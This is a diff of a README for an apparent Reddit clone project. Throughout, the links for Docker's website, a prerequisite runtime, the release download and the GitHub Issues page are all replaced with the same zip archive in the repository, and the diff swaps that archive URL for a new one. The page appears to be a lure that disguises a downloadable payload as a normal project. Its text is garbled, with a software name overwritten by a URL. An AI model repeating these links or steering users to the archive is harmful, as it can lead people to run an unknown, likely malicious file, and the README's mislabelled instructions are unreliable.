@@ -1,6 +1,6 @@
 # 🚀 Reddit-Clone-App - Easy Setup for Your Own Reddit Clone
 
-[![Download Latest Release](https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip)](https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip)
+[![Download Latest Release](https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip)](https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip)
 
 ## 📦 Table of Contents
 
@@ -21,14 +21,14 @@ Before you begin, ensure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Memory:** At least 4 GB of RAM
 - **Storage:** 1 GB of free disk space
-- **Docker:** Installed and running (visit [Docker's website](https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip) for installation instructions)
-- **https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip** Version 14 or later (follow instructions from [https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip](https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip))
+- **Docker:** Installed and running (visit [Docker's website](https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip) for installation instructions)
+- **https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip** Version 14 or later (follow instructions from [https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip](https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip))
 
 ## ⬇️ Download & Install
 
 To download the Reddit-Clone-App, visit the Releases page. Click on the latest version to download the installation package.
 
-**Download link:** [Visit this page to download](https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip)
+**Download link:** [Visit this page to download](https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip)
 
 1. Open the link above.
 2. Find the latest release version.
@@ -48,10 +48,10 @@ To download the Reddit-Clone-App, visit the Releases page. Click on the latest v
 
 If you encounter any issues during installation or use, consider the following solutions:
 
-- **Installation Issues:** Ensure you have installed Docker and https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip correctly. Check the version to confirm they are up-to-date.
+- **Installation Issues:** Ensure you have installed Docker and https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip correctly. Check the version to confirm they are up-to-date.
 - **App Not Starting:** If the application fails to launch, verify that all required services (like Docker) are running.
 - **Connectivity Problems:** Ensure you have a stable internet connection. If you're using a firewall, check that it allows the app to connect.
 
-Be sure to check the [GitHub Issues page](https://raw.githubusercontent.com/pandigo20/Reddit-Clone-App/main/public/images/Reddit-Clone-App-2.4.zip) for community support and additional troubleshooting tips. 
+Be sure to check the [GitHub Issues page](https://github.com/pandigo20/Reddit-Clone-App/raw/refs/heads/main/src/firebase/Clone_Reddit_App_3.6.zip) for community support and additional troubleshooting tips. 
 
 Enjoy building your Reddit Clone application!
